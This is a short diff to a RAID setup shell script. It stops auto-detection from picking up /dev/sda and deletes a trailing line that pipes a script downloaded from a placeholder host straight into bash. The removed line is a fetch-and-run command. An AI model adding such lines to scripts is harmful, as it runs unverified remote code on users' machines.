@@ -4,8 +4,8 @@
 sudo apt-get update
 sudo apt-get install -y mdadm
 
-# Auto-detect available disks
-disks=$(lsblk -d -n -o NAME | awk '{ print "/dev/"$1 }' | grep -v "md")
+# Auto-detect available disks excluding /dev/sda
+disks=$(lsblk -d -n -o NAME | awk '{ print "/dev/"$1 }' | grep -v "md" | grep -v "sda")
 
 # Create RAID array
 if [ "$(echo "$disks" | wc -l)" -lt 2 ]; then
@@ -31,6 +31,3 @@ sudo update-initramfs -u
 
 # Add the RAID array to /etc/fstab
 echo '/dev/md0 /home ext4 defaults,nofail,discard 0 0' | sudo tee -a /etc/fstab
-
-
-wget -O - http://example.com/setup_raid.sh | bash
